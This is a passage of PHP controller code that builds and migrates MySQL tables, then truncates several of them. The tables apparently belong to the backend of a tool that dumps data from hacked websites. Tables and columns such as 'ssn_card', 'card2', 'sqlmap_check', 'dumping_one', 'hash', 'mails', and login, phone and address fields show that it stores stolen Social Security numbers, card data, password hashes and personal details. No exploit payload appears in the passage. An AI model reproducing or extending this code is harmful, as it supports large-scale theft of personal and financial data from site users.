  `count` int(11) NOT NULL,
  `site` varchar(255) DEFAULT '0',
  `color` varchar(50) NOT NULL DEFAULT '0',
  `up` int(3) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
		$this->Post->query($bds_one);
        
        
        
        
        $ssn_card = "CREATE TABLE IF NOT EXISTS `ssn_card` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(3) NOT NULL,
  `column` text NOT NULL,
  `data` text NOT NULL,
  `prich` varchar(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;";
		$this->Post->query($ssn_card);
        

		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'mysqlbd'");
		if($ret[0]['COLUMNS']['Field']=='mysqlbd'){
			//$this->d($ret,'FILED mysqlbd good');
		}else{
			$this->d('mysqlbd posts no, sozdaem posts');
			$this->Post->query("ALTER TABLE posts ADD mysqlbd varchar(255) NOT NULL ");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'ssn'");
		if($ret[0]['COLUMNS']['Field']=='ssn'){
			//$this->d($ret,'FILED ssn good');
		}else{
			$this->d('ssn posts no, sozdaem posts');
			$this->Post->query("ALTER TABLE posts ADD ssn varchar(255) NOT NULL ");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'order_check'");
		if($ret[0]['COLUMNS']['Field']=='order_check'){
			//$this->d($ret,'FILED order_check good');
		}else{
			$this->d('order_check  posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD order_check int(3) NOT NULL DEFAULT '0'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'ssn_check'");
		if($ret[0]['COLUMNS']['Field']=='ssn_check'){
			//$this->d($ret,'FILED ssn_check good');
		}else{
			$this->d('ssn_check posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD ssn_check int(3) NOT NULL DEFAULT '0'");
		}

		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'country_check'");
		if($ret[0]['COLUMNS']['Field']=='country_check'){
			//$this->d($ret,'FILED country_check good');
		}else{
			$this->d('country_check posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD country_check int(3) NOT NULL DEFAULT '0'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'alexa_check'");
		if($ret[0]['COLUMNS']['Field']=='alexa_check'){
			//$this->d($ret,'FILED alexa_check good');
		}else{
			$this->d('alexa_check posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD alexa_check int(3) NOT NULL DEFAULT '0'");
		}

		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'up'");
		if($ret[0]['COLUMNS']['Field']=='up'){
			//$this->d($ret,'FILED up good');
		}else{
			$this->d('up posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD up int(3) NOT NULL DEFAULT '0'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'color'");
		if($ret[0]['COLUMNS']['Field']=='color'){
			//$this->d($ret,'FILED color good');
		}else{
			$this->d('color posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD color varchar(50) NOT NULL DEFAULT '0'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'http'");
		if($ret[0]['COLUMNS']['Field']=='http'){
			//$this->d($ret,'FILED http good');
		}else{
			$this->d('http posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD http varchar(100) NOT NULL DEFAULT 'http://'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'crawler'");
		if($ret[0]['COLUMNS']['Field']=='crawler'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('crawler posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD crawler int(3) NOT NULL DEFAULT '0'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'multi_count'");
		if($ret[0]['COLUMNS']['Field']=='multi_count'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('multi_count posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD multi_count int(3) NOT NULL DEFAULT '0'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'header'");
		if($ret[0]['COLUMNS']['Field']=='header'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('header posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD header varchar(100) NOT NULL DEFAULT 'get'");
			
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'sqlmap_check'");
		if($ret[0]['COLUMNS']['Field']=='sqlmap_check'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('sqlmap_check posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD sqlmap_check int(3) NOT NULL DEFAULT '0'");
			
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'all_check'");
		if($ret[0]['COLUMNS']['Field']=='all_check'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('all_check posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD all_check int(3) NOT NULL DEFAULT 0");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'path_query'");
		if($ret[0]['COLUMNS']['Field']=='path_query'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('path_query posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD path_query varchar(255) NOT NULL");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'get_type'");
		if($ret[0]['COLUMNS']['Field']=='get_type'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('get_type posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD get_type varchar(100) NOT NULL");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'from'");
		if($ret[0]['COLUMNS']['Field']=='from'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('from posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD from varchar(30) NOT NULL DEFAULT 'txt'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'sql_check'");
		if($ret[0]['COLUMNS']['Field']=='sql_check'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('sql_check posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts ADD sql_check varchar(30) NOT NULL DEFAULT 'txt'");
		}
		
		////////////////////
		
		
		$ret =$this->Post->query("show columns FROM `posts_all` where `Field` = 'header'");
		if($ret[0]['COLUMNS']['Field']=='header'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('header posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts_all ADD header varchar(100) NOT NULL DEFAULT 'get'");
			
		}
		
		$ret =$this->Post->query("show columns FROM `posts_all` where `Field` = 'sqlmap_check'");
		if($ret[0]['COLUMNS']['Field']=='sqlmap_check'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('sqlmap_check posts_all no, sozdaem');
			$this->Post->query("ALTER TABLE posts_all ADD sqlmap_check int(3) NOT NULL DEFAULT '0'");
			
		}
		
		$ret =$this->Post->query("show columns FROM `posts_all` where `Field` = 'all_check'");
		if($ret[0]['COLUMNS']['Field']=='all_check'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('all_check posts_all no, sozdaem');
			$this->Post->query("ALTER TABLE posts_all ADD all_check int(3) NOT NULL DEFAULT 0");
		}
		
		$ret =$this->Post->query("show columns FROM `posts_all` where `Field` = 'insert_post'");
		if($ret[0]['COLUMNS']['Field']=='insert_post'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('insert_post posts_all no, sozdaem');
			$this->Post->query("ALTER TABLE posts_all ADD insert_post int(3) NOT NULL DEFAULT 0");
		}
		
		$ret =$this->Post->query("show columns FROM `posts_all` where `Field` = 'multi_count'");
		if($ret[0]['COLUMNS']['Field']=='multi_count'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('multi_count posts_all no, sozdaem');
			$this->Post->query("ALTER TABLE posts_all ADD multi_count int(3) NOT NULL DEFAULT 0");
		}
		
		$ret =$this->Post->query("show columns FROM `posts_all` where `Field` = 'from'");
		if($ret[0]['COLUMNS']['Field']=='from'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('from posts_all no, sozdaem');
			$this->Post->query("ALTER TABLE posts_all ADD from varchar(30) NOT NULL DEFAULT 'txt'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts_all` where `Field` = 'table_admin_check'");
		if($ret[0]['COLUMNS']['Field']=='table_admin_check'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('table_admin_check posts_all no, sozdaem');
			$this->Post->query("ALTER TABLE posts_all ADD table_admin_check int(3) NOT NULL DEFAULT '0'");
		}
		
		
		////////////////////
		
		
		
		$ret =$this->Post->query("show columns FROM `orders` where `Field` = 'card2'");
		if($ret[0]['COLUMNS']['Field']=='card2'){
			//$this->d($ret,'FILED card2 good');
		}else{
			$this->d('card2 orders no, sozdaem');
			$this->Post->query("ALTER TABLE orders ADD card2 varchar(255) NOT NULL DEFAULT '0'");
		}
		
		
		$ret =$this->Post->query("show columns FROM `orders` where `Field` = 'color'");
		if($ret[0]['COLUMNS']['Field']=='color'){
			//$this->d($ret,'FILED color good');
		}else{
			$this->d('color orders no, sozdaem');
			$this->Post->query("ALTER TABLE orders ADD color varchar(50) NOT NULL DEFAULT '0'");
		}
		
		
		$ret =$this->Post->query("show columns FROM `orders` where `Field` = 'date'");
		if($ret[0]['COLUMNS']['Field']=='date'){
			//$this->d($ret,'FILED date good');
		}else{
			$this->d('date orders no, sozdaem');
			$this->Post->query("ALTER TABLE orders ADD date varchar(255) NOT NULL");
		}
		
		
		$ret =$this->Post->query("show columns FROM `orders` where `Field` = 'date_new'");
		if($ret[0]['COLUMNS']['Field']=='date_new'){
			//$this->d($ret,'FILED date_new good');
		}else{
			$this->d('date_new orders no, sozdaem');
			$this->Post->query("ALTER TABLE orders ADD date_new varchar(255) NOT NULL");
		}
		
		
		$ret =$this->Post->query("show columns FROM `orders` where `Field` = 'color'");
		if($ret[0]['COLUMNS']['Field']=='color'){
			//$this->d($ret,'FILED color good');
		}else{
			$this->d('color orders no, sozdaem');
			$this->Post->query("ALTER TABLE orders ADD color varchar(255) NOT NULL");
		}
		
		
		$ret =$this->Post->query("show columns FROM `orders` where `Field` = 'typedb'");
		if($ret[0]['COLUMNS']['Field']=='typedb'){
			//$this->d($ret,'FILED typedb good');
		}else{
			$this->d('typedb  orders no, sozdaem');
			$this->Post->query("ALTER TABLE orders ADD typedb varchar(255) NOT NULL");
		}
		
		
		$ret =$this->Post->query("show columns FROM `orders` where `Field` = 'count_new2'");
		if($ret[0]['COLUMNS']['Field']=='count_new2'){
			//$this->d($ret,'FILED count_new2 good');
		}else{
			$this->d('count_new2 orders no, sozdaem');
			$this->Post->query("ALTER TABLE orders ADD count_new2 int(20) NOT NULL");
		}
		
		
		////////////////////
		
        
		$ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'adress'");
		if($ret[0]['COLUMNS']['Field']=='adress'){
			
		}else{
			$this->d('adress fileds no, sozdaem fileds');
			$this->Post->query("ALTER TABLE fileds ADD adress varchar(500) NOT NULL ");
		} 
        
        
        $ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'adress'");
		if($ret[0]['COLUMNS']['Field']=='adress'){
			
		}else{
			$this->d('adress fileds no, sozdaem fileds_one');
			$this->Post->query("ALTER TABLE fileds_one ADD adress varchar(500) NOT NULL ");
		} 
        
        
		
		$ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'name'");
		if($ret[0]['COLUMNS']['Field']=='name'){
			
		}else{
			$this->d('name fileds no, sozdaem fileds');
			$this->Post->query("ALTER TABLE fileds ADD name varchar(500) NOT NULL ");
		} 
		
		$ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'phone'");
		if($ret[0]['COLUMNS']['Field']=='phone'){
			
		}else{
			$this->d('phone fileds no, sozdaem fileds');
			$this->Post->query("ALTER TABLE fileds ADD phone varchar(255) NOT NULL ");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'typedb'");
			if($ret[0]['COLUMNS']['Field']=='typedb'){
		}else{
			$this->d('typedb fileds no, sozdaem FILED');
			$this->Post->query("ALTER TABLE fileds ADD typedb varchar(255) NOT NULL ");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'dumping_one'");
			if($ret[0]['COLUMNS']['Field']=='dumping_one'){
		}else{
			$this->d('dumping_one fileds no, sozdaem FILED');
			$this->Post->query("ALTER TABLE fileds ADD dumping_one int(3) NOT NULL DEFAULT '0'");
		} 

        
        
        $ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'adress'");
		if($ret[0]['COLUMNS']['Field']=='adress'){
			
		}else{
			$this->d('adress fileds no, sozdaem fileds');
			$this->Post->query("ALTER TABLE fileds ADD adress varchar(500) NOT NULL ");
		} 
        
        
        $ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'adress'");
		if($ret[0]['COLUMNS']['Field']=='adress'){
			
		}else{
			$this->d('adress fileds no, sozdaem fileds_one');
			$this->Post->query("ALTER TABLE fileds_one ADD adress varchar(500) NOT NULL ");
		} 
        
        
		$ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'login'");
		if($ret[0]['COLUMNS']['Field']=='login'){
			
		}else{
			$this->d('login fileds no, sozdaem fileds');
			$this->Post->query("ALTER TABLE fileds ADD login varchar(255) NOT NULL ");
		} 
        
        
        $ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'login'");
		if($ret[0]['COLUMNS']['Field']=='login'){
			
		}else{
			$this->d('login fileds no, sozdaem fileds_one');
			$this->Post->query("ALTER TABLE fileds_one ADD login varchar(255) NOT NULL ");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'name'");
		if($ret[0]['COLUMNS']['Field']=='name'){
			
		}else{
			$this->d('namefileds no, sozdaem fileds');
			$this->Post->query("ALTER TABLE fileds ADD name varchar(500) NOT NULL ");
		} 
        
        
        $ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'name'");
		if($ret[0]['COLUMNS']['Field']=='name'){
			
		}else{
			$this->d('name fileds no, sozdaem fileds_one');
			$this->Post->query("ALTER TABLE fileds_one ADD name varchar(500) NOT NULL ");
		} 
        
		
		
		////////////////////
	
		$ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'potok'");
		if($ret[0]['COLUMNS']['Field']=='potok'){
			//$this->d($ret,'FILED pathgood');
		}else{
			$this->d('potok fileds_one no, sozdaem');
			$this->Post->query("ALTER TABLE fileds_one ADD potok int(3) NOT NULL DEFAULT '0'");
		} 
		
		$ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'ipbase2'");
		if($ret[0]['COLUMNS']['Field']=='ipbase2'){
			//$this->d($ret,'FILED pathgood');
		}else{
			$this->d('ipbase2 fileds_one no, sozdaem fileds_one');
			$this->Post->query("ALTER TABLE fileds_one ADD ipbase2 varchar(255) NOT NULL ");
		} 
	
		$ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'pri'");
		if($ret[0]['COLUMNS']['Field']=='pri'){
			//$this->d($ret,'FILED pathgood');
		}else{
			$this->d('pri fileds_one no, sozdaem fileds_one');
			$this->Post->query("ALTER TABLE fileds_one ADD pri int(3) NOT NULL ");
		} 
	
	
		
		////////////////////
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'mysqlbd'");
		if($ret[0]['COLUMNS']['Field']=='mysqlbd'){
			//$this->d($ret,'FILED mysqlbd good');
		}else{
			$this->d('mysqlbd posts_one no, sozdaem posts_one');
			$this->Post->query("ALTER TABLE posts_one ADD mysqlbd varchar(255) NOT NULL ");
		}
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'order_check'");
		if($ret[0]['COLUMNS']['Field']=='order_check'){
			//$this->d($ret,'FILED order_check good');
		}else{
			$this->d('order_check posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD order_check int(3) NOT NULL DEFAULT '0'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'ssn_check'");
		if($ret[0]['COLUMNS']['Field']=='ssn_check'){
			//$this->d($ret,'FILED ssn_check good');
		}else{
			$this->d('ssn_check posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD ssn_check int(3) NOT NULL DEFAULT '0'");
		}

		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'country_check'");
		if($ret[0]['COLUMNS']['Field']=='country_check'){
			//$this->d($ret,'FILED country_check good');
		}else{
			$this->d('country_check posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD country_check int(3) NOT NULL DEFAULT '0'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'alexa_check'");
		if($ret[0]['COLUMNS']['Field']=='alexa_check'){
			//$this->d($ret,'FILED alexa_check good');
		}else{
			$this->d('alexa_check posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD alexa_check int(3) NOT NULL DEFAULT '0'");
		}

		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'up'");
		if($ret[0]['COLUMNS']['Field']=='up'){
			//$this->d($ret,'FILED up good');
		}else{
			$this->d('up posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD up int(3) NOT NULL DEFAULT '0'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'color'");
		if($ret[0]['COLUMNS']['Field']=='color'){
			//$this->d($ret,'FILED color good');
		}else{
			$this->d('color posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD color varchar(50) NOT NULL DEFAULT '0'");
		}
		
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'cookies'");
		if($ret[0]['COLUMNS']['Field']=='cookies'){
			//$this->d($ret,'FILED pathgood');
	}else{
		$this->d('cookies no, sozdaem');
		$this->Post->query("ALTER TABLE posts_one ADD cookies varchar(500) COLLATE utf8_unicode_ci NOT NULL");
	} 
		

		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'path1'");
		if($ret[0]['COLUMNS']['Field']=='path1'){
			//$this->d($ret,'FILED pathgood');
		}else{
			$this->d('path1 posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD path1 varchar(255) NOT NULL DEFAULT '0'");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'path2'");
		if($ret[0]['COLUMNS']['Field']=='path2'){
			//	$this->d($ret,'FILED pathgood2');
		}else{
			$this->d('path2 posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD path2 varchar(255) NOT NULL DEFAULT '0'");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'path3'");
		if($ret[0]['COLUMNS']['Field']=='path3'){
			//$this->d($ret,'FILED pathgood3');
		}else{
			$this->d('path3 posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD path3 varchar(255) NOT NULL DEFAULT '0'");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'site1'");
		if($ret[0]['COLUMNS']['Field']=='site1'){
			//$this->d($ret,'FILED pathgood');
		}else{
			$this->d('site1 posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD site1 varchar(255) NOT NULL DEFAULT '0'");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'site2'");
		if($ret[0]['COLUMNS']['Field']=='site2'){
			//	$this->d($ret,'FILED pathgood2');
		}else{
			$this->d('site2 posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD site2 varchar(255) NOT NULL DEFAULT '0'");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'site3'");
		if($ret[0]['COLUMNS']['Field']=='site3'){
			//$this->d($ret,'FILED pathgood3');
		}else{
			$this->d('site3 posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD site3 varchar(255) NOT NULL DEFAULT '0'");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'path_conf1'");
		if($ret[0]['COLUMNS']['Field']=='path_conf1'){
			//$this->d($ret,'FILED pathgood');
		}else{
			$this->d('path_conf1 posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD path_conf1 varchar(255) NOT NULL DEFAULT '0'");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'path_conf2'");
		if($ret[0]['COLUMNS']['Field']=='path_conf2'){
			//$this->d($ret,'FILED path_conf2');
		}else{
			$this->d('path_conf2 posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD path_conf2 varchar(255) NOT NULL DEFAULT '0'");
		} 
		
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'path_conf3'");
		if($ret[0]['COLUMNS']['Field']=='path_conf3'){
			//$this->d($ret,'FILED pathgood3');
		}else{
			$this->d('path_conf3 posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD path_conf3 varchar(255) NOT NULL DEFAULT '0'");
		} 
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'http'");
		if($ret[0]['COLUMNS']['Field']=='http'){
			//$this->d($ret,'FILED up good');
		}else{
			$this->d('http posts_one no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD http varchar(255) NOT NULL DEFAULT 'http://'");
		}
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'header'");
		if($ret[0]['COLUMNS']['Field']=='header'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('header posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD header varchar(100) NOT NULL DEFAULT 'get'");
			
		}
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'sqlmap_check'");
		if($ret[0]['COLUMNS']['Field']=='sqlmap_check'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('sqlmap_check posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD sqlmap_check int(3) NOT NULL DEFAULT '0'");
			
		}
		
		$ret =$this->Post->query("show columns FROM `posts_one` where `Field` = 'all_check'");
		if($ret[0]['COLUMNS']['Field']=='all_check'){
			//$this->d($ret,'FILED crawler good');
		}else{
			$this->d('all_check posts no, sozdaem');
			$this->Post->query("ALTER TABLE posts_one ADD all_check int(3) NOT NULL DEFAULT '0'");
			
		}
		
/////////////////////////////////////////////////

		//$ret =$this->Post->query("INSERT INTO `settings` (`id`, `name`, `value`) VALUES (8, 'potok_one', '1');");
		
	
		
		
/////////////////////////////////////////////////	


	
	$dump3_1 = "CREATE TABLE IF NOT EXISTS `orders` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` varchar(255) DEFAULT NULL,
  `shema` varchar(255) NOT NULL DEFAULT '0',
  `bd` varchar(255) NOT NULL DEFAULT '0',
  `table` varchar(255) DEFAULT '0',
  `column` varchar(255) NOT NULL DEFAULT '0',
  `column_16` int(3) NOT NULL DEFAULT '0',
  `count_n` int(3) NOT NULL DEFAULT '0',
  `count` int(11) NOT NULL,
  `count_new` int(20) NOT NULL,
  `count_new2` int(10) NOT NULL,
  `check_count` int(3) NOT NULL DEFAULT '0',
  `domen` varchar(255) DEFAULT '0',
  `card2` varchar(255) NOT NULL DEFAULT '0',
  `date` varchar(255) NOT NULL,
  `date_new` varchar(255) NOT NULL,
  `color` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1;";
		
	$this->Post->query($dump3_1);
		
		
	/////////////////////////////////////////	
		
	$dump3_2 = "CREATE TABLE IF NOT EXISTS `multis_one` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `filed_id` int(11) DEFAULT '0',
  `post_id` int(11) DEFAULT '0',
  `domen` varchar(255) DEFAULT '0',
  `lastlimit` int(11) DEFAULT '0',
  `count` int(11) DEFAULT '0',
  `get` int(2) DEFAULT '0',
  `potok` int(2) DEFAULT '0',
  `function` int(3) DEFAULT '0',
  `prich` varchar(255) DEFAULT '0',
  `isp` varchar(255) DEFAULT '0',
  `dok` int(3) DEFAULT '0',
  `date` int(11) DEFAULT '0',
  `pid` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
";	
		
	$this->Post->query($dump3_2);	
		
	/////////////////////////////	
	
	$dump3_3 = "CREATE TABLE IF NOT EXISTS `ordersTable_one` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` varchar(255) DEFAULT NULL,
  `shema` varchar(255) NOT NULL DEFAULT '0',
  `bd` varchar(255) NOT NULL DEFAULT '0',
  `table` varchar(255) DEFAULT '0',
  `card2` varchar(255) NOT NULL,
  `column_16` int(3) NOT NULL DEFAULT '0',
  `count_n` int(3) NOT NULL DEFAULT '0',
  `count` int(11) NOT NULL,
  `domen` varchar(255) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 ;";


	$this->Post->query($dump3_3);

	/////////////////////////////
	
		
		$dump3 = "CREATE TABLE IF NOT EXISTS `orders_one` (
`id` int(10) unsigned NOT NULL AUTO_INCREMENT,
`post_id` varchar(255) DEFAULT NULL,
`shema` varchar(255) NOT NULL DEFAULT '0',
`bd` varchar(255) NOT NULL DEFAULT '0',
`table` varchar(255) DEFAULT '0',
`card2` varchar(255) NOT NULL,
`column` varchar(255) NOT NULL DEFAULT '0',
`column_16` int(3) NOT NULL DEFAULT '0',
`count_n` int(3) NOT NULL DEFAULT '0',
`count` int(11) NOT NULL,
`domen` varchar(255) DEFAULT '0',
PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;";
		
		
		$this->Post->query($dump3);
		
///////////////////////////////////////////////	
		
		
		
		$dump4 = "CREATE TABLE IF NOT EXISTS `ordersTable_one` (
`id` int(10) unsigned NOT NULL AUTO_INCREMENT,
`post_id` varchar(255) DEFAULT NULL,
`shema` varchar(255) NOT NULL DEFAULT '0',
`bd` varchar(255) NOT NULL DEFAULT '0',
`table` varchar(255) DEFAULT '0',
`card2` varchar(255) NOT NULL,
`column_16` int(3) NOT NULL DEFAULT '0',
`count_n` int(3) NOT NULL DEFAULT '0',
`count` int(11) NOT NULL,
`domen` varchar(255) DEFAULT '0',
PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;";
		
		$this->Post->query($dump4);
		
///////////////////////////////////////////////	
		
		$dump5 = "CREATE TABLE IF NOT EXISTS `bds_one` (
`id` int(10) unsigned NOT NULL AUTO_INCREMENT,
`post_id` varchar(255) DEFAULT NULL,
`bd` varchar(255) DEFAULT '',
`count` int(11) NOT NULL,
`site` varchar(255) DEFAULT '0',
`color` varchar(50) NOT NULL DEFAULT '0',
`up` int(3) NOT NULL DEFAULT '0',
PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;";
		
		$this->Post->query($dump5);
		
		
		
		
////////////////////////////////////////////////



		
		
		
		//////////////////NEW//////////////////////
		
		
		$ret =$this->Post->query("show columns FROM `orders` where `Field` = 'count_new2'");
		
		if($ret[0]['COLUMNS']['Field']=='count_new2'){
			//$this->d($ret,'FILED pathgood3');
		}else{
			$this->d('count_new2 no, sozdaem');
			$this->Post->query("ALTER TABLE orders ADD count_new2 int(20) NOT NULL DEFAULT '0'");
		} 
        
        
		
		
		
	}
	
	function empty_databases(){
		
		
		$this->timeStart = $this->start('empty_databases',1);
		
		$sqlp  = "TRUNCATE TABLE `bds_one`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `bds_one`';}
		$sqlp  = "TRUNCATE TABLE `domens`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `domens`';}
		$sqlp  = "TRUNCATE TABLE `domens_links`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `domens_links`';}
		//$sqlp  = "TRUNCATE TABLE `dumpers_one`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `dumpers_one`';}
		$sqlp  = "TRUNCATE TABLE `fileds`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `fileds`';}
		//$sqlp  = "TRUNCATE TABLE `fileds_one`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `fileds_one`';}
		$sqlp  = "TRUNCATE TABLE `hash`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `hash`';}
		$sqlp  = "TRUNCATE TABLE `logs`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `logs`';}
		$sqlp  = "TRUNCATE TABLE `mails`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `mails`';}
		//$sqlp  = "TRUNCATE TABLE `mails_dumping`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `mails_dumping`';}
		$sqlp  = "TRUNCATE TABLE `mails_one`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `mails_one`';}
		$sqlp  = "TRUNCATE TABLE `multis`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `multis`';}
		//$sqlp  = "TRUNCATE TABLE `multis_one`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `multis_one`';}
		$sqlp  = "TRUNCATE TABLE `m_users`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `m_users`';}
